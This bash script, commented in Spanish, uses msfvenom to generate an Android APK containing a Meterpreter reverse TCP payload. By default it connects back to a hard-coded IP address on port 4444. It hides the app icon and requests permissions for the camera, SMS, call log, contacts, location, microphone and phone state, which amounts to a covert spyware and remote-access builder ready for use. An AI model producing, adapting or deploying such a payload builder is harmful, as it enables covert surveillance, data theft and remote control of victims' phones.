#!/bin/bash

# Script para generar APK con msfvenom compatible con Android 16
# Uso: ./generate_apk.sh <LHOST> <LPORT>

LHOST=${1:-"194.163.135.124"}
LPORT=${2:-"4444"}
APK_NAME="android_payload.apk"

echo "Generando APK con msfvenom..."
echo "LHOST: $LHOST"
echo "LPORT: $LPORT"

# Generar APK con msfvenom (android/meterpreter/reverse_tcp)
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  AndroidWipeUserData=false \
  AndroidHideAppIcon=true \
  AndroidPermissionCamera=true \
  AndroidPermissionReadSms=true \
  AndroidPermissionSendSms=true \
  AndroidPermissionCallLog=true \
  AndroidPermissionReadContacts=true \
  AndroidPermissionAccessCoarseLocation=true \
  AndroidPermissionAccessFineLocation=true \
  AndroidPermissionRecordAudio=true \
  AndroidPermissionReadPhoneState=true \
  AndroidPermissionAccessNetworkState=true \
  AndroidPermissionInternet=true \
  -o $APK_NAME

if [ -f "$APK_NAME" ]; then
  echo "APK generada exitosamente: $APK_NAME"
  echo "Tamaño: $(du -h $APK_NAME | cut -f1)"
else
  echo "Error al generar APK"
  exit 1
fi
